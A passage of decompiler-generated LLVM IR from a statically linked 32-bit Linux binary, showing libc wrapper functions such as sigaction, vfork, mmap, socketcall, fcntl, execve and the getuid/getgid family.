  store i32 %v1_804db0f, i32* %ebx.global-to-local, align 4
  %v1_804db10 = load i32, i32* %esi.global-to-local, align 4
  %v7_804db10 = icmp ult i32 %v1_804db0f, %v1_804db10
  br i1 %v7_804db10, label %dec_label_pc_804db08, label %dec_label_pc_804db14

dec_label_pc_804db14:                             ; preds = %dec_label_pc_804db08, %dec_label_pc_804dae3
  store i32 134535962, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.378 to i32), i32 -134557696), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.378 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_804db2c, label %dec_label_pc_804db38

dec_label_pc_804db2c:                             ; preds = %dec_label_pc_804db14, %dec_label_pc_804db2c
  %v4_804db2c42 = phi i32 [ %v1_804db33, %dec_label_pc_804db2c ], [ 0, %dec_label_pc_804db14 ]
  store i32 ptrtoint (i32* @global_var_804db33.387 to i32), i32* %stack_var_-160, align 4
  %v5_804db2c = mul i32 %v4_804db2c42, 4
  %v6_804db2c = add i32 %v5_804db2c, ptrtoint (i32* @global_var_8053000.378 to i32)
  %v7_804db2c = inttoptr i32 %v6_804db2c to i32*
  %v8_804db2c = load i32, i32* %v7_804db2c, align 4
  call void @__pseudo_call(i32 %v8_804db2c)
  %v0_804db33 = load i32, i32* @ebx, align 4
  %v1_804db33 = add i32 %v0_804db33, 1
  store i32 %v1_804db33, i32* @ebx, align 4
  %v1_804db34.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804db34 = icmp ult i32 %v1_804db33, %v1_804db34.pre
  br i1 %v7_804db34, label %dec_label_pc_804db2c, label %dec_label_pc_804db38

dec_label_pc_804db38:                             ; preds = %dec_label_pc_804db2c, %dec_label_pc_804db14
  %v0_804db41 = load i32, i32* %stack_var_-160, align 4
  %v1_804db41 = call i32 @__errno_location(i32 %v0_804db41)
  %v1_804db46 = inttoptr i32 %v1_804db41 to i32*
  store i32 0, i32* %v1_804db46, align 4
  %v0_804db55 = call i32 @__GI___h_errno_location()
  store i32 %v0_804db55, i32* @eax, align 4
  %v1_804db5a = inttoptr i32 %v0_804db55 to i32*
  store i32 0, i32* %v1_804db5a, align 4
  %v0_804db60 = load i32, i32* @eax, align 4
  store i32 %v0_804db60, i32* %stack_var_-160, align 4
  %v0_804db67 = load i32, i32* @edi, align 4
  store i32 %v0_804db67, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_804db76 = load i32, i32* @eax, align 4
  %v1_804db79 = call i32 @__GI_exit(i32 %v0_804db76)
  %v0_804db85 = load i32, i32* @ebx, align 4
  %v1_804db85 = inttoptr i32 %v0_804db85 to %sigcontext*
  %v2_804db85 = call i32 @sigreturn(%sigcontext* %v1_804db85)
  %v0_804db8d = load i32, i32* @ebx, align 4
  %v1_804db8d = inttoptr i32 %v0_804db8d to %sigcontext*
  %v2_804db8d = call i32 @sigreturn(%sigcontext* %v1_804db8d)
  ret i32 %v2_804db8d

; uselistorder directives
  uselistorder i32 %v1_804db33, { 1, 2, 0 }
  uselistorder i32 %v1_804db0f, { 1, 2, 0 }
  uselistorder i32 %v2_804da4d, { 1, 0 }
  uselistorder i32 %v1_804da4a, { 2, 1, 0 }
  uselistorder i32 %v1_804da29, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804da26, { 1, 0 }
  uselistorder i32 %v1_804d9fd, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.378 to i32), i32 -134557696), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.378 to i32), i32 -134557696), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_804db2c, { 1, 0 }
  uselistorder label %dec_label_pc_804db08, { 1, 0 }
  uselistorder label %dec_label_pc_804dae3, { 1, 0 }
  uselistorder label %dec_label_pc_804da4a, { 1, 0 }
  uselistorder label %dec_label_pc_804da32, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804db8f = load i32, i32* @esi, align 4
  %v0_804db90 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804dba5 = icmp eq i32* %arg2, null
  br i1 %v1_804dba5, label %dec_label_pc_804dbf9, label %dec_label_pc_804dba9

dec_label_pc_804dba9:                             ; preds = %entry
  %v2_804dba9 = load i32, i32* %arg2, align 4
  store i32 %v2_804dba9, i32* %stack_var_-148, align 4
  %v1_804dbb2 = add i32 %tmp11, 4
  %v3_804dbc4 = bitcast i32* %stack_var_-136 to i16*
  %v4_804dbc4 = call i32 @memcpy(i16* %v3_804dbc4, i32 %v1_804dbb2, i32 128)
  br label %dec_label_pc_804dbf9

dec_label_pc_804dbf9:                             ; preds = %entry, %dec_label_pc_804dba9
  %v1_804dbfb = icmp eq i32 %arg3, 0
  br i1 %v1_804dbfb, label %dec_label_pc_804dc03, label %dec_label_pc_804dbff

dec_label_pc_804dbff:                             ; preds = %dec_label_pc_804dbf9
  %v2_804dbff = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804dc03

dec_label_pc_804dc03:                             ; preds = %dec_label_pc_804dbf9, %dec_label_pc_804dbff
  %v0_804dc12 = phi i32 [ 0, %dec_label_pc_804dbf9 ], [ %v2_804dbff, %dec_label_pc_804dbff ]
  br i1 %v1_804dba5, label %dec_label_pc_804dc10, label %dec_label_pc_804dc09

dec_label_pc_804dc09:                             ; preds = %dec_label_pc_804dc03
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804dc10

dec_label_pc_804dc10:                             ; preds = %dec_label_pc_804dc03, %dec_label_pc_804dc09
  %v0_804dc13 = phi %sigaction* [ null, %dec_label_pc_804dc03 ], [ %phitmp, %dec_label_pc_804dc09 ]
  %v5_804dc1b = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_804dc13, i32 %v0_804dc12, i32 8)
  store i32 %v5_804dc1b, i32* %ebx.global-to-local, align 4
  br i1 %v1_804dbfb, label %dec_label_pc_804dc5e, label %dec_label_pc_804dc29

dec_label_pc_804dc29:                             ; preds = %dec_label_pc_804dc10
  %v2_804dc29 = icmp slt i32 %v5_804dc1b, 0
  br i1 %v2_804dc29, label %dec_label_pc_804dc5e, label %dec_label_pc_804dc2d

dec_label_pc_804dc2d:                             ; preds = %dec_label_pc_804dc29
  %v3_804dc2d = load i32, i32* %stack_var_-288, align 4
  %v2_804dc31 = inttoptr i32 %arg3 to i32*
  store i32 %v3_804dc2d, i32* %v2_804dc31, align 4
  %v2_804dc39 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804dc3e = add i32 %arg3, 4
  %v3_804dc42 = inttoptr i32 %v1_804dc3e to i16*
  %v4_804dc42 = call i32 @memcpy(i16* %v3_804dc42, i32 %v2_804dc39, i32 128)
  %v2_804dc4b = add i32 %arg3, 132
  %v3_804dc4b = inttoptr i32 %v2_804dc4b to i32*
  %v2_804dc58 = add i32 %arg3, 136
  %v3_804dc58 = inttoptr i32 %v2_804dc58 to i32*
  %v0_804dc64.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dc5e

dec_label_pc_804dc5e:                             ; preds = %dec_label_pc_804dc29, %dec_label_pc_804dc10, %dec_label_pc_804dc2d
  %v0_804dc64 = phi i32 [ %v5_804dc1b, %dec_label_pc_804dc29 ], [ %v5_804dc1b, %dec_label_pc_804dc10 ], [ %v0_804dc64.pre, %dec_label_pc_804dc2d ]
  store i32 %v0_804db90, i32* @ebx, align 4
  store i32 %v0_804db8f, i32* @esi, align 4
  ret i32 %v0_804dc64

; uselistorder directives
  uselistorder i1 %v1_804dbfb, { 1, 0 }
  uselistorder i1 %v1_804dba5, { 1, 0 }
  uselistorder i32* null, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804dc5e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804dc10, { 1, 0 }
  uselistorder label %dec_label_pc_804dc03, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf9, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804dc72 = call i32 @vfork()
  %v5_804dc75 = icmp ult i32 %v0_804dc72, -4095
  %v1_804dc7a = icmp eq i1 %v5_804dc75, false
  call void @__pseudo_cond_branch(i1 %v1_804dc7a, i32 134543768)
  ret i32 %v0_804dc72
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_804dc84 = load i32, i32* @ebx, align 4
  %v2_804dc8b = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804dc8b, i32* @ebx, align 4
  %v8_804dc8f = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804dc84, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_804dc8f, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134543768)
  ret i32 %v8_804dc8f

; uselistorder directives
  uselistorder i32 %v8_804dc8f, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dca0 = load i32, i32* @ebx, align 4
  store i32 %v0_804dca0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804dcb3 = call i32 @int80_syscall(i32 102)
  store i32 %v1_804dcb3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dcb3, -4095
  br i1 %tmp, label %dec_label_pc_804dccc, label %dec_label_pc_804dcc0

dec_label_pc_804dcc0:                             ; preds = %entry
  %v0_804dcc0 = load i32, i32* %stack_var_-4, align 4
  %v1_804dcc0 = call i32 @__errno_location(i32 %v0_804dcc0)
  %v0_804dcc5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dcc5 = sub i32 0, %v0_804dcc5
  %v2_804dcc7 = inttoptr i32 %v1_804dcc0 to i32*
  store i32 %v1_804dcc5, i32* %v2_804dcc7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dccc

dec_label_pc_804dccc:                             ; preds = %entry, %dec_label_pc_804dcc0
  %v0_804dccd = phi i32 [ %v1_804dcb3, %entry ], [ -1, %dec_label_pc_804dcc0 ]
  %v2_804dccc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dccc, i32* @edx, align 4
  %v2_804dcd0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dcd0, i32* @ebx, align 4
  ret i32 %v0_804dccd

; uselistorder directives
  uselistorder i32 %v1_804dcb3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dccc, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804dcd4 = load i32, i32* @edi, align 4
  %v0_804dcd5 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_804dced = add i32 %arg2, -12
  %v6_804dcf3 = icmp ugt i32 %v1_804dced, 2
  br i1 %v6_804dcf3, label %dec_label_pc_804dd03, label %dec_label_pc_804dcf5

dec_label_pc_804dcf5:                             ; preds = %entry
  %v4_804dcf9 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804dced)
  br label %dec_label_pc_804dd25

dec_label_pc_804dd03:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804dd0b = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804dd0b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804dd0b, -4095
  br i1 %tmp, label %dec_label_pc_804dd23, label %dec_label_pc_804dd17

dec_label_pc_804dd17:                             ; preds = %dec_label_pc_804dd03
  %v1_804dd17 = call i32 @__errno_location(i32 %v0_804dcd5)
  %v0_804dd1c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dd1c = sub i32 0, %v0_804dd1c
  %v2_804dd1e = inttoptr i32 %v1_804dd17 to i32*
  store i32 %v1_804dd1c, i32* %v2_804dd1e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd23

dec_label_pc_804dd23:                             ; preds = %dec_label_pc_804dd03, %dec_label_pc_804dd17
  %v0_804dd23 = phi i32 [ %v2_804dd0b, %dec_label_pc_804dd03 ], [ -1, %dec_label_pc_804dd17 ]
  br label %dec_label_pc_804dd25

dec_label_pc_804dd25:                             ; preds = %dec_label_pc_804dcf5, %dec_label_pc_804dd23
  %v0_804dd2a = phi i32 [ %v4_804dcf9, %dec_label_pc_804dcf5 ], [ %v0_804dd23, %dec_label_pc_804dd23 ]
  store i32 %v0_804dcd5, i32* @ebx, align 4
  store i32 %v0_804dcd4, i32* @edi, align 4
  ret i32 %v0_804dd2a

; uselistorder directives
  uselistorder i32 %v2_804dd0b, { 1, 0, 2 }
  uselistorder i32 %v0_804dcd5, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804dd25, { 1, 0 }
  uselistorder label %dec_label_pc_804dd23, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dd2c = load i32, i32* @edi, align 4
  store i32 %v0_804dd2c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804dd44 = load i32, i32* @ebx, align 4
  %v1_804dd4c = call i32 @int80_syscall(i32 221)
  store i32 %v1_804dd4c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dd4c, -4095
  br i1 %tmp, label %dec_label_pc_804dd64, label %dec_label_pc_804dd58

dec_label_pc_804dd58:                             ; preds = %entry
  %v1_804dd58 = call i32 @__errno_location(i32 %v0_804dd44)
  %v0_804dd5d = load i32, i32* %edi.global-to-local, align 4
  %v1_804dd5d = sub i32 0, %v0_804dd5d
  %v2_804dd5f = inttoptr i32 %v1_804dd58 to i32*
  store i32 %v1_804dd5d, i32* %v2_804dd5f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dd64

dec_label_pc_804dd64:                             ; preds = %entry, %dec_label_pc_804dd58
  %v0_804dd67 = phi i32 [ %v1_804dd4c, %entry ], [ -1, %dec_label_pc_804dd58 ]
  %v2_804dd69 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dd69, i32* %edi.global-to-local, align 4
  ret i32 %v0_804dd67

; uselistorder directives
  uselistorder i32 %v1_804dd4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dd64, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804dd6d = load i32, i32* @esi, align 4
  store i32 %v0_804dd6d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804dd81 = load i32, i32* @ebx, align 4
  %v7_804dd89 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804dd89, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_804dd89, -4095
  br i1 %tmp, label %dec_label_pc_804dda1, label %dec_label_pc_804dd95

dec_label_pc_804dd95:                             ; preds = %entry
  %v1_804dd95 = call i32 @__errno_location(i32 %v0_804dd81)
  %v0_804dd9a = load i32, i32* %esi.global-to-local, align 4
  %v1_804dd9a = sub i32 0, %v0_804dd9a
  %v2_804dd9c = inttoptr i32 %v1_804dd95 to i32*
  store i32 %v1_804dd9a, i32* %v2_804dd9c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dda1

dec_label_pc_804dda1:                             ; preds = %entry, %dec_label_pc_804dd95
  %v0_804dda2 = phi i32 [ %v7_804dd89, %entry ], [ -1, %dec_label_pc_804dd95 ]
  %v2_804dda1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dda1, i32* @edx, align 4
  %v2_804dda4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804dda4, i32* @esi, align 4
  ret i32 %v0_804dda2

; uselistorder directives
  uselistorder i32 %v7_804dd89, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dda1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ddd0 = load i32, i32* @ebx, align 4
  store i32 %v0_804ddd0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804dde3 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804dde3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804dde3, -4095
  br i1 %tmp, label %dec_label_pc_804ddfc, label %dec_label_pc_804ddf0

dec_label_pc_804ddf0:                             ; preds = %entry
  %v0_804ddf0 = load i32, i32* %stack_var_-4, align 4
  %v1_804ddf0 = call i32 @__errno_location(i32 %v0_804ddf0)
  %v0_804ddf5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ddf5 = sub i32 0, %v0_804ddf5
  %v2_804ddf7 = inttoptr i32 %v1_804ddf0 to i32*
  store i32 %v1_804ddf5, i32* %v2_804ddf7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ddfc

dec_label_pc_804ddfc:                             ; preds = %entry, %dec_label_pc_804ddf0
  %v0_804ddfd = phi i32 [ %v4_804dde3, %entry ], [ -1, %dec_label_pc_804ddf0 ]
  %v2_804ddfc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ddfc, i32* @edx, align 4
  %v2_804de00 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de00, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ddfd

; uselistorder directives
  uselistorder i32 %v4_804dde3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ddfc, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de04 = load i32, i32* @edi, align 4
  store i32 %v0_804de04, i32* %stack_var_-4, align 4
  %v4_804de08 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804de08, i32* %edi.global-to-local, align 4
  %v0_804de14 = load i32, i32* @ebx, align 4
  %v5_804de1c = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_804de1c = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_804de1c = call i32 @execve(i8* %arg1, [1 x i8*] %v5_804de1c, [1 x i8*] %v8_804de1c)
  store i32 %v9_804de1c, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_804de1c, -4095
  br i1 %tmp12, label %dec_label_pc_804de34, label %dec_label_pc_804de28

dec_label_pc_804de28:                             ; preds = %entry
  %v1_804de28 = call i32 @__errno_location(i32 %v0_804de14)
  %v0_804de2d = load i32, i32* %edi.global-to-local, align 4
  %v1_804de2d = sub i32 0, %v0_804de2d
  %v2_804de2f = inttoptr i32 %v1_804de28 to i32*
  store i32 %v1_804de2d, i32* %v2_804de2f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804de34

dec_label_pc_804de34:                             ; preds = %entry, %dec_label_pc_804de28
  %v0_804de35 = phi i32 [ %v9_804de1c, %entry ], [ -1, %dec_label_pc_804de28 ]
  %v2_804de34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804de34, i32* @edx, align 4
  %v2_804de38 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de38, i32* %edi.global-to-local, align 4
  ret i32 %v0_804de35

; uselistorder directives
  uselistorder i32 %v9_804de1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de34, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804de3f = ptrtoint i32* %stack_var_-8 to i32
  %v2_804de46 = call i32 @getrlimit(i32 7, i32 %v2_804de3f)
  store i32 256, i32* @edx, align 4
  %v2_804de53 = icmp slt i32 %v2_804de46, 0
  br i1 %v2_804de53, label %dec_label_pc_804de5b, label %dec_label_pc_804de57

dec_label_pc_804de57:                             ; preds = %entry
  %v3_804de57 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804de57, i32* @edx, align 4
  br label %dec_label_pc_804de5b

dec_label_pc_804de5b:                             ; preds = %entry, %dec_label_pc_804de57
  %v0_804de5b = phi i32 [ 256, %entry ], [ %v3_804de57, %dec_label_pc_804de57 ]
  ret i32 %v0_804de5b

; uselistorder directives
  uselistorder label %dec_label_pc_804de5b, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de64 = load i32, i32* @ebx, align 4
  store i32 %v0_804de64, i32* %stack_var_-4, align 4
  %v1_804de6d = call i32 @int80_syscall(i32 202)
  store i32 %v1_804de6d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804de6d, -4095
  br i1 %tmp, label %dec_label_pc_804de84, label %dec_label_pc_804de78

dec_label_pc_804de78:                             ; preds = %entry
  %v0_804de78 = load i32, i32* %stack_var_-4, align 4
  %v1_804de78 = call i32 @__errno_location(i32 %v0_804de78)
  %v0_804de7d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de7d = sub i32 0, %v0_804de7d
  %v2_804de7f = inttoptr i32 %v1_804de78 to i32*
  store i32 %v1_804de7d, i32* %v2_804de7f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de84

dec_label_pc_804de84:                             ; preds = %entry, %dec_label_pc_804de78
  %v0_804de85 = phi i32 [ %v1_804de6d, %entry ], [ -1, %dec_label_pc_804de78 ]
  %v2_804de88 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de88, i32* @ebx, align 4
  ret i32 %v0_804de85

; uselistorder directives
  uselistorder i32 %v1_804de6d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de84, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de8c = load i32, i32* @ebx, align 4
  store i32 %v0_804de8c, i32* %stack_var_-4, align 4
  %v1_804de95 = call i32 @int80_syscall(i32 201)
  store i32 %v1_804de95, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804de95, -4095
  br i1 %tmp, label %dec_label_pc_804deac, label %dec_label_pc_804dea0

dec_label_pc_804dea0:                             ; preds = %entry
  %v0_804dea0 = load i32, i32* %stack_var_-4, align 4
  %v1_804dea0 = call i32 @__errno_location(i32 %v0_804dea0)
  %v0_804dea5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dea5 = sub i32 0, %v0_804dea5
  %v2_804dea7 = inttoptr i32 %v1_804dea0 to i32*
  store i32 %v1_804dea5, i32* %v2_804dea7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804deac

dec_label_pc_804deac:                             ; preds = %entry, %dec_label_pc_804dea0
  %v0_804dead = phi i32 [ %v1_804de95, %entry ], [ -1, %dec_label_pc_804dea0 ]
  %v2_804deb0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804deb0, i32* @ebx, align 4
  ret i32 %v0_804dead

; uselistorder directives
  uselistorder i32 %v1_804de95, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804deac, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804deb4 = load i32, i32* @ebx, align 4
  store i32 %v0_804deb4, i32* %stack_var_-4, align 4
  %v1_804debd = call i32 @int80_syscall(i32 200)
  store i32 %v1_804debd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804debd, -4095
  br i1 %tmp, label %dec_label_pc_804ded4, label %dec_label_pc_804dec8

dec_label_pc_804dec8:                             ; preds = %entry
  %v0_804dec8 = load i32, i32* %stack_var_-4, align 4
  %v1_804dec8 = call i32 @__errno_location(i32 %v0_804dec8)
  %v0_804decd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804decd = sub i32 0, %v0_804decd
  %v2_804decf = inttoptr i32 %v1_804dec8 to i32*
  store i32 %v1_804decd, i32* %v2_804decf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ded4

dec_label_pc_804ded4:                             ; preds = %entry, %dec_label_pc_804dec8
  %v0_804ded5 = phi i32 [ %v1_804debd, %entry ], [ -1, %dec_label_pc_804dec8 ]
  %v2_804ded8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ded8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ded5

; uselistorder directives
  uselistorder i32 %v1_804debd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ded4, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dedc = load i32, i32* @ebx, align 4
  store i32 %v0_804dedc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804deef = call i32 @int80_syscall(i32 191)
  store i32 %v1_804deef, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804deef, -4095
  br i1 %tmp, label %dec_label_pc_804df08, label %dec_label_pc_804defc

dec_label_pc_804defc:                             ; preds = %entry
  %v0_804defc = load i32, i32* %stack_var_-4, align 4
  %v1_804defc = call i32 @__errno_location(i32 %v0_804defc)
  %v0_804df01 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804df01 = sub i32 0, %v0_804df01
  %v2_804df03 = inttoptr i32 %v1_804defc to i32*
  store i32 %v1_804df01, i32* %v2_804df03, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804df08

dec_label_pc_804df08:                             ; preds = %entry, %dec_label_pc_804defc
  %v0_804df09 = phi i32 [ %v1_804deef, %entry ], [ -1, %dec_label_pc_804defc ]
  %v2_804df0c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df0c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804df09

; uselistorder directives
